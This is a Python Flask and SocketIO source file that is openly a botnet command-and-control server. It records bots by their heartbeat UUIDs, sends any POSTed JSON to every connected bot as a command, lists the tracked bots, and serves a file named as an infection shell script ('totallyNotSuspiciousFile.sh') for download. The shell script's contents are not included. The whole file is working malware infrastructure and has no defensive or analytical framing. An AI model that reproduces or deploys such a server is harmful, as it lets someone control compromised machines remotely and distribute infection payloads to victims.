from typing import Dict, List
from flask import Flask, request, send_file, render_template
from flask_socketio import SocketIO, emit
import jsonpickle

from botnet_activity import BotnetActivity

app = Flask(__name__)
sio = SocketIO(app)

botnets = {}


@sio.on('connect')
def connect():
    print("Socket connected")


@sio.event
def disconnect():
    print("Socket disconnected")

@sio.event
def heartbeat(uuid: str):
    global botnets

    if uuid in botnets:
        botnets[uuid].heartbeat()
    else:
        botnets[uuid] = BotnetActivity(uuid)


@app.route('/', methods=["POST"])
def command_control():
    emit("command", request.get_json(), namespace="/", broadcast=True)
    return "Done"

@app.route('/botnets', methods=["GET"])
def get_botnets():
    return jsonpickle.encode(botnets)

@app.route('/script', methods=["GET"])
def myscript():
    path= "Infection script/totallyNotSuspiciousFile.sh"
    return send_file(path)


@app.route('/home')
def home():
    return render_template("index.html")


if __name__ == '__main__':
    sio.run(app)
